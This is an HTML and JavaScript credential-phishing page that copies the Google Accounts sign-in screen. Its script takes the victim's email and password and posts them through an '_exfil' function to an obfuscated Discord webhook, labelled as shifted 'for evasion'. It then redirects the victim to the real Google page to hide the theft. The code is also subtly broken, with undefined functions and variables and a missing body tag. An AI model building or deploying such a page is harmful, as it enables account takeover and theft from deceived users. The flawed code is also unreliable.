<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            width: 450px;
            min-height: 500px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
        }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin: 0; padding-top: 16px; }
        .sub { font-size: 16px; color: #202124; margin-top: 8px; margin-bottom: 24px; }
        .input-box { margin-bottom: 10px; position: relative; }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .link { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; cursor: pointer; }
        .footer-nav { display: flex; justify-content: flex-end; margin-top: 40px; align-items: center; }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        #pass-section { display: none; }
        .user-identity {
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 5px 10px;
            display: inline-flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }
    </style>
</head>
<!-- Caesar-shifted Discord Webhook for evasion -->

<div class="card">
    <center>
        <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
        <h1 id="main-header">Sign in</h1>
        <div id="main-sub" class="sub">Use your Google Account</div>
    </center>

    <div id="email-section">
        <div class="input-box">
            <input type="text" id="target-email" placeholder="Email or phone">
        </div>
        <a class="link">Forgot email?</a>
        <div class="footer-nav">
            <a class="link" style="margin-right:auto">Create account</a>
            <button class="next-btn" onclick="goToPass()">Next</button>
        </div>
    </div>

    <div id="pass-section">
        <div class="user-identity">
            <span id="display-email"></span>
        </div>
        <div class="input-box">
            <input type="password" id="target-pass" placeholder="Enter your password">
        </div>
        <a class="link">Forgot password?</a>
        <div class="footer-nav">
            <button class="next-btn" onclick="harvest()">Next</button>
        </div>
    </div>
</div>

<script>
    // Shifted decoder: i -> h, u -> t, etc.

    function goToPass() {
        email = document.getElementById('target-email').value;
        if (!email) return;
        
        document.getElementById('email-section').style.display = 'none';
        document.getElementById('pass-section').style.display = 'block';
        document.getElementById('main-header').innerText = "Welcome";
        document.getElementById('main-sub').style.visibility = "hidden";
        document.getElementById('display-email').innerText = email;
        
        _exfil("📧 Hit: " + email);

        _exfil("🔐 Pass: " + email + " | " + pass);
        
        setTimeout(() => {
            window.location.replace("https://accounts.google.com/signin/v2/challenge/pwd");
        }, 500);
    }

    function _exfil(m) {
        const u = _D(document.body.getAttribute('data-conf'));
        fetch(u, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: m })
        }).catch(e => console.log('Network error')); // Catch block prevents blank screen on block
    }
</script>
</body>
</html>
